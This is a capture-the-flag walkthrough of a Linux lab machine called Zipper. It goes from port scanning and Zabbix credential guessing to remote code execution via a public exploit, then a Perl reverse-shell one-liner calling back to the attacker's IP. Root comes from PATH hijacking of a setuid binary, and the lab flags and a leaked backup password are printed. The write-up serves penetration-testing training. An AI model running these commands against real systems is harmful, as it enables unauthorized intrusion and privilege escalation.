# Zipper

> OS: Linux Difficulty: Hard Points: 40 Release: 20 Oct 2018 IP: 10.10.10.108

## Port Scanning

```
t0thkr1s@kali ~> sudo nmap -A -Pn -p- 10.10.10.108
[sudo] password for t0thkr1s:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 03:30 CDT
Nmap scan report for 10.10.10.108
Host is up (0.037s latency).
Not shown: 65174 closed ports, 358 filtered ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux)
| ssh-hostkey:
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  tcpwrapped
```

## HTTP Enumeration

```
t0thkr1s@kali /o/ffuf (master) > go run help.go main.go -u http://10.10.10.108/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

/'___\  /'___\           /'___\
/\ \__/ /\ \__/  __  __  /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\   \ \_\  \ \____/  \ \_\
\/_/    \/_/   \/___/    \/_/

v1.1.0-git
________________________________________________

:: Method           : GET
:: URL              : http://10.10.10.108/FUZZ
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

zabbix                  [Status: 301, Size: 313, Words: 20, Lines: 10]
[Status: 200, Size: 10918, Words: 3499, Lines: 376]
```

!()[screenshots/zabbix.png]

## Zabbix Enumeration

[https://github.com/unioslo/zabbix-cli](https://github.com/unioslo/zabbix-cli)

```
t0thkr1s@kali ~> zabbix-cli-init --zabbix-url http://10.10.10.108/zabbix

zabbix_cli
```

I was able to log in with `zapper : zapper` credentials. We deduced this from the guest user.

```
#############################################################
Welcome to the Zabbix command-line interface (v2.2.1)
Connected to server http://10.10.10.108/zabbix (v3.0.21)
#############################################################
Type help or \? to list commands.

[zabbix-cli zapper@zabbix-ID]$ show_usergroups
+---------+---------------------------+--------------------+-------------+--------+
| GroupID | Name                      |     GUI access     |    Status   | Users  |
+---------+---------------------------+--------------------+-------------+--------+
|       9 | Disabled                  | System default (0) | Disable (1) |        |
|      11 | Enabled debug mode        | System default (0) |  Enable (0) |        |
|       8 | Guests                    | System default (0) |  Enable (0) | guest  |
|      12 | No access to the frontend |    Disable (2)     |  Enable (0) | zapper |
|       7 | Zabbix administrators     | System default (0) |  Enable (0) | Admin  |
+---------+---------------------------+--------------------+-------------+--------+

[zabbix-cli zapper@zabbix-ID]$ create_usergroup
--------------------------------------------------------
# Name: gui_access
# GUI access [0]:
# Status [0]:
--------------------------------------------------------

[Done]: Usergroup (gui_access) with ID: 13 created.


[zabbix-cli zapper@zabbix-ID]$ add_user_to_usergroup
--------------------------------------------------------
# Usernames: zapper
# Usergroups: gui_access
--------------------------------------------------------

[Done]: Users zapper added to these usergroups: gui_access


[zabbix-cli zapper@zabbix-ID]$ remove_user_from_usergroup
--------------------------------------------------------
# Username: zapper
# Usergroups: No access to the frontend
--------------------------------------------------------

[Done]: User zapper removed from this usergroup: No access to the frontend


[zabbix-cli zapper@zabbix-ID]$
```

!()[screenshots/config.png]

!()[screenshots/dashboard.png]

(https://www.exploit-db.com/exploits/39937)[https://www.exploit-db.com/exploits/39937]

## Gaining Access

```
t0thkr1s@kali ~/Downloads [1]> python zabbix.py
[zabbix_cmd]>>:  id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)

[zabbix_cmd]>>:  ls -la
total 84
drwxr-xr-x   1 root root 4096 Mar 13 04:31 .
drwxr-xr-x   1 root root 4096 Mar 13 04:31 ..
-rwxr-xr-x   1 root root    0 Mar 13 04:31 .dockerenv
drwxrwxrwx   2 1000 1000 4096 Mar 13 07:30 backups
drwxr-xr-x   1 root root 4096 Sep  8  2018 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Mar 13 04:31 dev
drwxr-xr-x   1 root root 4096 Mar 13 04:31 etc
drwxr-xr-x   2 root root 4096 Apr 24  2018 home
drwxr-xr-x   1 root root 4096 Aug 21  2018 lib
drwxr-xr-x   2 root root 4096 Aug 21  2018 media
drwxr-xr-x   2 root root 4096 Aug 21  2018 mnt
drwxr-xr-x   2 root root 4096 Aug 21  2018 opt
dr-xr-xr-x 133 root root    0 Mar 13 04:31 proc
...
```

## Using the Zabbix Server

We landed in a Docker container which is not good since we want the host machine. There’s an option called `execute_on`, which has 2 possible values : `0` to execute on zabbix agent , and `1` to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option 1 which means we are executing commands on zabbix server. So we will edit the exploit json data and add "execute_on" : "0" in those 2 parts.

```
t0thkr1s@kali ~/Downloads> nvim zabbix.py
t0thkr1s@kali ~/Downloads> python zabbix.py
[zabbix_cmd]>>:  id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
[zabbix_cmd]>>:  perl -e 'use Socket;$i="10.10.14.28";$p=9898;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


t0thkr1s@kali ~> ncat -lvp 9898
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9898
Ncat: Listening on 0.0.0.0:9898
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:50260.
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ ls -la
total 970056
drwxr-xr-x  22 root   root        4096 Sep  8  2018 .
drwxr-xr-x  22 root   root        4096 Sep  8  2018 ..
drwxrwxrwx   2 zapper zapper      4096 Mar 13 09:06 backups
drwxr-xr-x   2 root   root        4096 Sep  8  2018 bin
drwxr-xr-x   3 root   root        4096 Aug 21  2019 boot
drwxr-xr-x  18 root   root        3880 Mar 13 04:31 dev
drwxr-xr-x  82 root   root        4096 Aug 21  2019 etc
drwxr-xr-x   3 root   root        4096 Sep  8  2018 home
lrwxrwxrwx   1 root   root          33 Sep  8  2018 initrd.img -> boot/initrd.img-4.15.0-33-generic
lrwxrwxrwx   1 root   root          33 Sep  8  2018 initrd.img.old -> boot/initrd.img-4.15.0-33-generic
drwxr-xr-x  20 root   root        4096 Oct  2  2018 lib
drwx------   2 root   root       16384 Sep  8  2018 lost+found
drwxr-xr-x   2 root   root        4096 Sep  8  2018 media
drwxr-xr-x   2 root   root        4096 Sep  8  2018 mnt
drwxr-xr-x   2 root   root        4096 Sep  8  2018 opt
dr-xr-xr-x 135 root   root           0 Mar 13 04:30 proc
drwx------   5 root   root        4096 Aug 21  2019 root
drwxr-xr-x  22 root   root         700 Mar 13 06:26 run
drwxr-xr-x   2 root   root        4096 Aug 21  2019 sbin
drwxr-xr-x   2 root   root        4096 Sep  8  2018 srv
-rw-------   1 root   root   993244160 Sep  8  2018 swapfile
dr-xr-xr-x  13 root   root           0 Mar 13 07:32 sys
drwxrwxrwt  10 root   root        4096 Mar 13 06:26 tmp
drwxr-xr-x  10 root   root        4096 Sep  8  2018 usr
drwxr-xr-x  11 root   root        4096 Sep  8  2018 var
lrwxrwxrwx   1 root   root          30 Sep  8  2018 vmlinuz -> boot/vmlinuz-4.15.0-33-generic
lrwxrwxrwx   1 root   root          30 Sep  8  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-33-generic
$ cd /home
$ ls
zapper
$ cd zapper
$ ls
user.txt  utils
$ ls -la
total 48
drwxr-xr-x 6 zapper zapper 4096 Sep  9  2018 .
drwxr-xr-x 3 root   root   4096 Sep  8  2018 ..
-rw------- 1 zapper zapper    0 Sep  8  2018 .bash_history
-rw-r--r-- 1 zapper zapper  220 Sep  8  2018 .bash_logout
-rw-r--r-- 1 zapper zapper 4699 Sep  8  2018 .bashrc
drwx------ 2 zapper zapper 4096 Sep  8  2018 .cache
drwxrwxr-x 3 zapper zapper 4096 Sep  8  2018 .local
-rw-r--r-- 1 zapper zapper  807 Sep  8  2018 .profile
-rw-rw-r-- 1 zapper zapper   66 Sep  8  2018 .selected_editor
drwx------ 2 zapper zapper 4096 Sep  8  2018 .ssh
-rw------- 1 zapper zapper   33 Sep  9  2018 user.txt
drwxrwxr-x 2 zapper zapper 4096 Sep  8  2018 utils
$ cd utils
$ ls -la
total 20
drwxrwxr-x 2 zapper zapper 4096 Sep  8  2018 .
drwxr-xr-x 6 zapper zapper 4096 Sep  9  2018 ..
-rwxr-xr-x 1 zapper zapper  194 Sep  8  2018 backup.sh
-rwsr-sr-x 1 root   root   7556 Sep  8  2018 zabbix-service
$ cat backup.sh
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
echo $?$

$ su zapper
Password: ZippityDoDah


Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K    /backups/zapper_backup-2020-03-13.7z


zapper@zipper:~/utils$ id
uid=1000(zapper) gid=1000(zapper) groups=1000(zapper),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
zapper@zipper:~/utils$ cd ..
zapper@zipper:~$ cat user.txt
aa29e93f48c64f8586448b6f6e38fe33
zapper@zipper:~$
```

> User Flag: aa29e93f48c64f8586448b6f6e38fe33

## Privilege Escalation

```
t0thkr1s@kali ~/Downloads> ssh -i zapper zapper@10.10.10.108
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-33-generic i686)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Mar 13 10:42:49 2020 from 10.10.14.28

Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K    /backups/zapper_backup-2020-03-13.7z
4.0K    /backups/zabbix_scripts_backup-2020-03-13.7z


zapper@zipper:~$ cd utils/
zapper@zipper:~/utils$ ltrace -s 256 ./zabbix-service
__libc_start_main(0x4d76ed, 1, 0xbfb8bb44, 0x4d7840 <unfinished ...>
    setuid(0)                                                                = -1
    setgid(0)                                                                = -1
    printf("start or stop?: ")                                               = 16
    fgets(start or stop?: start
    "start\n", 10, 0xb7ed85c0)                                         = 0xbfb8ba72
    strcspn("start\n", "\n")                                                 = 5
    strcmp("start", "start")                                                 = 0
    system("systemctl daemon-reload && systemctl start zabbix-agent"Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files
    <no return ...>
        --- SIGCHLD (Child exited) ---
        <... system resumed> )                                                   = 256
        +++ exited (status 0) +++
```

This command is being executed when we type start : `systemctl daemon-reload && systemctl start zabbix-agent`, so what are we going to do is hijack a binary. By default systemctl points to `/bin/systemctl`
We will add `/home/zapper/utils` as the first entry in `PATH` env variable , so the system will look there first : `export PATH=/home/zapper/utils:$PATH`

```
zapper@zipper:~/utils$ nano systemctl
zapper@zipper:~/utils$ chmod 777 systemctl
zapper@zipper:~/utils$ cat systemctl
#!/bin/bash
/bin/bash
zapper@zipper:~/utils$ export PATH=/home/zapper/utils:$PATH
zapper@zipper:~/utils$ ./zabbix-service
start or stop?: start

Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K    /backups/zapper_backup-2020-03-13.7z
4.0K    /backups/zabbix_scripts_backup-2020-03-13.7z


root@zipper:~/utils# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(zapper)
root@zipper:~/utils# cd /root
root@zipper:/root# ls
root.txt  scripts
root@zipper:/root# cat root.txt
a7c743d35b8efbedfd9336492a8eab6e
root@zipper:/root#
```

> Root Flag: a7c743d35b8efbedfd9336492a8eab6e